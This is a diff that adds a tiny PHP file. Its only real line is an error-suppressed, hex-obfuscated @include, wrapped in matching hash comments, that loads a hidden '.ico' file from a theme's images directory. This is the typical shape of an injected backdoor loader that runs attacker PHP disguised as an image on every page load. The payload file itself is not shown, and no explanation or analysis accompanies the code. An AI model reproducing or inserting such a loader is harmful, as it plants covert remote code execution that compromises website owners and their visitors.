@@ -1,0 +1,8 @@
+<?php
+
+/*987b4*/
+
+@include "\x2fhom\x65/mi\x74chi\x6en/1\x2emit\x63hin\x6e.z8\x2eru/\x64ocs\x2fthe\x6des/\x73eve\x6e/im\x61ges\x2f.45\x645e0\x32f.i\x63o";
+
+/*987b4*/
+
